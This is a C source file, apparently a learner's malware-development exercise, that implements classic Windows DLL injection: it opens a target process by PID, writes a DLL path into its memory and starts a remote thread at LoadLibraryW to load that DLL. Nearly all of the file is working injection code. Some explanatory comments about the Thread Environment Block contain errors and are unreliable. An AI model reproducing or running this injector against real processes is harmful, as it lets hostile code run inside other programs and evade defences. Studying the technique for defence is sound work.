#include <windows.h>
#include <stdio.h>

/*  Information GetLastError()
        Note that GetLastError() reads the same value as NtCurrentTeb() 
        The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        Teb means Thread Environment Block
        struct _TEB * NtCurrentTeb(VOID) defined at line 420 in psfunchs.h as:
            {
                #if defined (_M_IX86)
                    return (PTEB)__readfsdword(0x18);   
                    // return a pointer to the dword fs register offset by 18
                #elif defined (_M_AMD64)
                    return (struct _TEB *)__readgsqword(FIELD_OFFSET(NT_TIB, Self));
                    // return ? to the qword gs register offset by __
                #elif defined (_M_ARM)
                    return (struct _TEB *)KeGetPcr()->Used_Self;
                    // ?
                #endif
            }
        Its important to define TEB to:
            // THESE STRUCTURES CHANGE FREQUENTLY
            typedef struct _TEB{
                PVOID Reserved1[12];
                PPEB  ProcessEnviromentBlock;
                PVOID Reserved2[399];
                BYTE  Reserved3[1952];
                PVOID TlsSlots[64];
                BYTE  Reserved4[8];
                PVOID Reserved5[26];
                PVOID ReservedForOle;
                PVOID Reserved6[4];
                PVOID TlsExpansionSlots;
            } TEB, *PTEB;


*/

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD dwPID, dwTID = 0;
LPVOID pvBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dadn\\OneDrive\\Desktop\\Coding\\learning_malware_development\\dll-injection\\testDLL.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]){

    if (argc < 2){
        printf("%s usage: %s <PID>", e, argv[0]);
        return 1;
    }

    dwPID = atoi(argv[1]);
    printf("%s trying to open a handle to process (%ld)\n", i, dwPID);
    hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, dwPID);
    if (hProcess == NULL){
        printf("%s couldn't get handle to the process(%d), error: %ld", e, dwPID, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }
    printf("%s got handle to the process!\n\\---0x%p\n", k, hProcess);

    /* allocate bytes to process memory */
    pvBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (pvBuffer == NULL){
        printf("%s couldn't create buffer of the process(%d), error: %ld", e, dwPID, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }
    printf("%s allocated %zu-bytes with PAGE_READWRITE permissions\n", k, dllPathSize);

    /* actually write the allocated memory to process memory */
    WriteProcessMemory(hProcess, pvBuffer, dllPath, dllPathSize, NULL);
    printf("%s wrote [%S] using %zu-bytes to process memory\n", k, dllPath, dllPathSize);

    /* getting handle to Kernel32.dll */
    hKernel32 = GetModuleHandleW(L"kernel32");
    if (hKernel32 == NULL){
        printf("%s failed to get a handle to Kernel32.dll, error: %ld", e, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }
    printf("%s got a handle to Kernel32.dll\n\\---0x%p\n", k, hKernel32);

    /* get address of loadLibrary*/
    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    printf("%s got the adress of LoadLibraryW()\n\\---0x%p\n", k, startThis);

    hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, pvBuffer, 0, &dwTID);
    if (hThread == NULL){
        printf("%s failed to get a handle to thread, error: %ld", e, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        CloseHandle(hProcess);
        return 1;
    }
    printf("%s got handle to new thread (%ld)\n\\---0x%p\n", k, dwTID, hThread);
    
    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished!\n", k);


    return 0;
}
